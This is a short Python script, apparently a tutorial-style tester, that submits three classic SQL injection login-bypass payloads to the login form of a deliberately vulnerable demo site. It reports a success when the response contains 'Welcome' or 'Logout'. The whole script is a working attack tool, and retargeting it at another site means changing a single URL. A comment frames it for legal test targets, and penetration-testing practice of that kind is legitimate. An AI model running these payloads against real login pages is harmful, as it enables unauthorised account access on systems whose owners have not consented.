import requests
from bs4 import BeautifulSoup

# Target URL (Change to a legal test site like DVWA or Bug Bounty)
target_url = "http://testphp.vulnweb.com/login.php"  

# Common SQL Injection payloads
payloads = ["' OR '1'='1", "' OR 1=1 --", "admin'--"]

def test_sql_injection(url, payloads):
    for payload in payloads:
        data = {"username": payload, "password": "test"}
        response = requests.post(url, data=data)
        
        # Check if login bypassed
        if "Welcome" in response.text or "Logout" in response.text:
            print(f"[!] SQL Injection Successful! Payload: {payload}")
            break
        else:
            print(f"[X] Failed: {payload}")

test_sql_injection(target_url, payloads)
